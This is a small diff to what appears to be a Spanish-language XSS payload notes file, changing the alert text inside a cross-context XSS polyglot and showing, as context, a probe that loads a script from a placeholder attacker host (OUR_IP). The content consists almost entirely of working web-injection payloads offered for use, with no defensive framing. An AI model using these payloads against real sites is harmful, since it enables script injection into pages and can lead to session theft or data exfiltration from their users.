@@ -22,7 +22,7 @@ No HTML inject and script clean:
 
 Polyglots:
 
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('el_pedro') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('el_pedro2')//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('porota') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('porota')//>\x3e
 
 probar si se conecta a otro servidor:
 <script src=http://OUR_IP></script>
